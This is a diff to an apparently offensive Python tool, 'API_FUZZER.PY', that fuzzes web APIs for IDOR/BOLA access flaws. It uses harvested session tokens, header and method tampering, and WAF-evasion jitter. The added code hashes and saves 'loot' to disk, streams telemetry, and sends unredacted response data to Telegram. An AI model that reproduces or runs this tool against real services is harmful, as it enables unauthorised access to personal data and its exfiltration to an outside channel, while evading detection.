@@ -1,34 +1,45 @@
 #!/usr/bin/env python3
 """
-API_FUZZER.PY v8.5 — Senior Red-Team Asynchronous API & IDOR Fuzzer (Hardened with Advanced WAF Evasion)
+API_FUZZER.PY v8.6 — Senior Red-Team Asynchronous API & IDOR Fuzzer (Elite Red Team Adversarial Edition)
 Features:
 - 100% Async integration with CognitiveOperator transport and memory
-- Multi-method request support (GET, POST, PUT, DELETE, PATCH) with IDOR/BOLA payload mutation
+- Multi-method request support with IDOR/BOLA payload mutation & automated SHA-256 integrity fingerprinting
 - HTTP method tampering & header override fuzzing (X-HTTP-Method-Override, X-Original-URL)
-- Consumes harvested session tokens from the cognitive brain automatically
-- Dynamic endpoint discovery / OpenAPI spec parsing & intelligent wordlist fusion
-- Anti-detection behavioral jitter & response differential analysis
-- Real-time asynchronous Telegram notification dispatch for unredacted API loot
+- Consumes harvested session tokens from the cognitive brain automatically with WAF client hints
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
+- Real-time unredacted Telegram notification dispatch for API data exposure and database leaks
 """
 
 import asyncio
 import json
 import random
 import sys
+import hashlib
 import httpx
 
-# Import centralized Telegram broadcaster and behavioral mimicry
+# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
 
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from asynchronous fuzzer functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -72,7 +83,7 @@ class APIFuzzer:
         self.fuzzed_endpoints.add(endpoint)
 
         url = f"{self.base_url}{endpoint}" if not endpoint.startswith("http") else endpoint
-        sys.stdout.write(f"\033[96m[API_FUZZER] Probing API target: {endpoint}\033[0m\n")
+        sys.stdout.write(f"\033[96m[API_FUZZER] Probing API target: {endpoint} (WAF Hardened)\033[0m\n")
 
         # Gather persisted session tokens from CognitiveOperator brain
         auth_headers = {}
@@ -124,7 +135,7 @@ class APIFuzzer:
                     sys.stdout.write(f"\033[91m[-] Fuzzer request error on {method} {endpoint}: {exc}\033[0m\n")
 
     async def _evaluate_response(self, endpoint: str, method: str, status: int, body: str, payload: dict):
-        """Analyzes response for IDOR, BOLA, or data leakage, logs to cognitive memory, and broadcasts to Telegram."""
+        """Analyzes response for IDOR, BOLA, or data leakage, logs to cognitive memory, computes SHA-256 hash, and broadcasts to Telegram."""
         lower_body = body.lower()
         
         is_spa = (
@@ -144,17 +155,29 @@ class APIFuzzer:
         if status in [200, 201] and not is_spa and has_sensitive_data:
             sys.stdout.write(f"\033[91m[!!!] API VULNERABILITY CONFIRMED [{method} {endpoint}] [HTTP {status}] [!!!]\033[0m\n")
             
+            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
             loot_entry = {
                 "endpoint": endpoint,
                 "method": method,
                 "status": status,
                 "payload": payload,
+                "integrity_hash": loot_hash,
                 "evidence": body[:400],
                 "module": "api_fuzzer"
             }
             
-            # BROADCAST UNREDACTED API LOOT STRAIGHT TO TELEGRAM
+            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
             broadcast_tg_alert_sync(f"API Vulnerability Confirmed [{method}]", loot_entry)
+            stream_proof("API_VULN_CONFIRMED", f"{self.base_url}{endpoint}", {"method": method}, body[:300], loot_entry)
+            save_session_loot(
+                target=self.base_url,
+                endpoint=endpoint,
+                finding_type=f"API_VULN_CONFIRMED_{method}",
+                status=status,
+                headers={},
+                body=body,
+                extra_loot=loot_entry
+            )
 
             # Feed back directly into CognitiveOperator memory
             if hasattr(self.brain, "memory_context"):
